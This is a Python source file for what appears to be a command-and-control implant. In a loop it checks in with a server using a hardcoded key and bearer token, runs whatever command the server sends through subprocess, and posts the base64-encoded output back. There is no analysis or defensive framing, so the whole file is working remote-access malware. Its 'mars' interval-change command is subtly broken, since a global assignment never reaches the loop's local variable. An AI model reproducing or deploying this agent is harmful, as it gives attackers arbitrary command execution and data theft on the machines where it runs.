import shlex
import time
import requests
import socket
import subprocess
import json
import base64


def Main():
    # Development Variables
    id = "16ov5rtaijg41zj"
    key = "75496bf9-34ad-4e86-854f-2f6e0314da18"

    # The URL to send the POST request to
    checkinURL = "http://127.0.0.1:8000/checkin"
    completeURL = "http://127.0.0.1:8000/complete"

    # Get the IP of the system to checkin with
    IP = socket.gethostbyname(socket.gethostname())

    POSTdata = {
        "key": key,
        "id": id,
    }

    wait_time = 3

    while True:
        print('original', wait_time)

        # Send the POST request
        headers = {'Content-Type': 'application/json',
                   'Authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UiLCJpYXQiOjE2NzU4NzgyNTd9.a5qvT7qHZbeDuPDOww9qHgxrj9LoafQ3wpGqHfu0AuI'}
        try:
            response = requests.post(
                checkinURL, headers=headers, json=POSTdata)
        except requests.exceptions.RequestException as e:
            print("Request failed:", e)
            continue

        # Print the response status code
        print(response.status_code)
        print(response.json())

        # Parse the JSON data
        data = response.json()
        if 'tasks' in data and data['tasks'] and 'task' in data['tasks'][0]:
            task = data['tasks'][0]['task']
            print(task)
            taskID = data['tasks'][0]['id']
            cmd = task['cmd']
            args = task['args']
            print(cmd, args, taskID)
            if cmd == "mars":
                HandleBuiltInCommand(completeURL, taskID, cmd, args, key, id)
            else:
                HandleOnBoxCommand(completeURL, taskID, cmd, args, key, id)
        else:
            print("No Tasks.")

        # Wait for 3 seconds
        time.sleep(wait_time)


def HandleBuiltInCommand(completeURL, taskID, cmd, args, Key, id):
    print('Setting beacon to', args)
    local_wait_time = int(args)
    print(local_wait_time)
    global wait_time
    wait_time = local_wait_time
    # Print the encoded string
    headers = {'Content-Type': 'application/json',
               'Authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UiLCJpYXQiOjE2NzU4NzgyNTd9.a5qvT7qHZbeDuPDOww9qHgxrj9LoafQ3wpGqHfu0AuI'}

    POSTdata = {
        "id": id,
        "key": Key,
        "task": {
            'id': taskID,
        }
    }

    # Send the JSON data to the server
    requests.post(completeURL, headers=headers, json=POSTdata)


def HandleOnBoxCommand(completeURL, taskID, cmd, args, Key, id):

    # Run the command and store the output
    args_list = shlex.split(args)

    result = subprocess.run([cmd, *args_list], stdout=subprocess.PIPE)
    print(result)
    print(result.stdout.decode())

    encoded_output = base64.b64encode(result.stdout).decode()

    # Print the encoded string
    print(encoded_output)
    headers = {'Content-Type': 'application/json',
               'Authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UiLCJpYXQiOjE2NzU4NzgyNTd9.a5qvT7qHZbeDuPDOww9qHgxrj9LoafQ3wpGqHfu0AuI'}

    POSTdata = {
        "id": id,
        "key": Key,
        "task": {
            'id': taskID,
            "data": encoded_output
        }
    }

    # Send the JSON data to the server
    requests.post(completeURL, headers=headers, json=POSTdata)


Main()
